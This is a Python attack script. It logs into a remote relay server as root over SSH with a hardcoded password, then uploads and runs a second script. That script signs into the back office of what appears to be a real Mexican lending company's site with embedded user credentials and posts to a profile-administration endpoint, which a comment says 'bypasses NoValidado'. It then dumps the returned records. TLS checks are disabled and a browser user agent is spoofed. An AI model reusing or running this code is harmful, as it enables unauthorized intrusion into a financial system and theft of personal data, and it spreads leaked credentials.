import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, sys, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

# LOGIN
r0 = s.get("https://core.findep.mx/", timeout=10)
token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r0.text)
tok = token_m.group(1) if token_m else ""
r = s.post("https://core.findep.mx/valida.do",
    data={"cve_idToken": tok, "msjPass": "", "cveUsr": "jcruzval",
          "cve_usr": "jcruzval", "cve_psd": "Fisa1234*", "ok_btn": "Entrar"},
    allow_redirects=True, timeout=15)
sys.stdout.write(f"Login: {len(r.text)}b\n\n")

# POST to adm_de_perfil.do (bypasses NoValidado)
r = s.post("https://core.findep.mx/backoffice/adm_de_perfil.do",
    data={"accion": "1", "nombre_form": "CRUZ", "apaterno_form": "VALDEZ",
          "amaterno_form": "", "nomina_form": "726507581",
          "id_empresa_tag": "1"},
    timeout=15)

# RAW DUMP - full page
sys.stdout.write(f"=== RAW DUMP ({len(r.text)}b) ===\n\n")

# Split into manageable chunks and print
text = r.text
chunk = 4000
for i in range(0, len(text), chunk):
    sys.stdout.write(text[i:i+chunk])
    sys.stdout.flush()

sys.stdout.write("\n\n=== END RAW DUMP ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/core_raw.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/core_raw.py 2>&1', timeout=120)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
